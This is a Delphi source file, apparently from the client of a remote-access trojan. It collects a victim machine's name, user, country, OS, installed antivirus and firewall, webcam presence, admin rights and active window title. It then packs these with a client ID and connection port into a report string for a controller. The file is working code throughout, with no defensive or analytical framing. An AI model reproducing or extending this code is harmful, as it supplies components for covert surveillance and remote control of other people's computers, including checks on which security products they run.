unit UnitInformations;

interface

uses
  Windows, SysUtils, ShellAPI, GetSecurityCenterInfo, UnitUtils, UnitCapture,
  UnitConfiguration;

function ListMainInfos: string;

implementation        

uses
  UnitConnection;

var
  IsNTAdmin: function(dwReserved: LongInt; lpdwReserved: LongInt): LongInt; stdcall;
                    
function GetComputer: string;
var
  TmpStr: array[0..255] of Char;
  Size: DWORD;
begin
  Size := 256;
  if GetComputerName(TmpStr, Size) then Result := TmpStr;
end;

function GetUser: string;
var
  TmpStr: array[0..255] of Char;
  Size: DWORD;
begin
  Size := 256;
  if GetUserName(TmpStr, Size) then Result := TmpStr;
end;

function GetCountryCode :string;
var
  Buffer: array[0..4] of Char;
begin
  GetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SISO3166CTRYNAME, Buffer, SizeOf(Buffer));
  Result := PChar(@Buffer[0]);
end;

function IsAdministrator: string;
begin
  Result := 'Unknown';
  if @IsNTAdmin = nil then
  begin
    LoadLibrary('advpack');
    @IsNTAdmin := GetProcAddress(getmodulehandle('advpack'),'IsNTAdmin');
  end;

  if @IsNTAdmin = nil then Exit;
  if IsNTAdmin(0, 0) <> 0 then Result := 'Yes' else Result := 'No';
end;

function IsWebcamInstalled: string;
  function CheckWebcamDrivers: Boolean;
  var
    dName, dVer: array[0..MAX_PATH] of Char;
  begin
    Result := capGetDriverDescription(0, @dName, SizeOf(dName), @dVer, SizeOf(dVer));
  end;
begin
  if CheckWebcamDrivers then Result := 'Yes' else Result := 'No';
  //because i get nothing with CamHelper.CamCount or CamHelper.GetCams
end;

function GetAntivirus: string;
var
  Sec: TSecurityCenterInfo;
begin
  Sec := TSecurityCenterInfo.Create;
  GetSecInfo(AntiVirusProduct, Sec);
  Result := Sec.displayName;
  if Result = '' then Result := 'Not found' else
    Delete(Result, LastDelimiter(',', Result), Length(Result));
  Sec.Free;
end;

function GetFirewalls: string;
var
  Sec: TSecurityCenterInfo;
begin
  Sec := TSecurityCenterInfo.Create;
  GetSecInfo(FirewallProduct, Sec);
  Result := Sec.displayName; 
  if Result = '' then Result := 'Not found' else
    Delete(Result, LastDelimiter(',', Result), Length(Result));
  Sec.Free;
end;

function Is64BitOS: Boolean;
type
  TIsWow64Process = function(Handle:THandle; var IsWow64 : BOOL) : BOOL; stdcall;
var
  hKernel32 : Integer;
  IsWow64Process: TIsWow64Process;
  IsWow64: BOOL;
begin
  Result := False;
  hKernel32 := LoadLibrary('kernel32.dll');
  if (hKernel32 = 0) then Exit;
  @IsWow64Process := GetProcAddress(hkernel32, 'IsWow64Process');
  if Assigned(IsWow64Process) then
  begin
    IsWow64 := False;
    if (IsWow64Process(GetCurrentProcess, IsWow64)) then Result := IsWow64 else Exit;
  end;               

  FreeLibrary(hKernel32);
end;
   
function GetOSArchitecture: string;
begin
  if Is64BitOS then Result := '64 bits' else Result := '32 bits';
end;
      
function GetOS: string;
begin
  Result := ReadKeyString(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\',
    'ProductName', ''); //don't know if this method is still working in windows 10 active
  Result := Result + ' ' + GetOSArchitecture;
end;

function ListMainInfos: string;
begin
  Result := Configuration.ClientId + '|' + GetCountryCode + '|' + GetOS  + '|' + GetAntivirus + '|' +
    GetFirewalls + '|' + IsWebcamInstalled + '|' + IsAdministrator + '|' + GetActiveCaption + '|' +
    IntToStr(MainConnection.RemotePort) + '|'; 
end;

end.
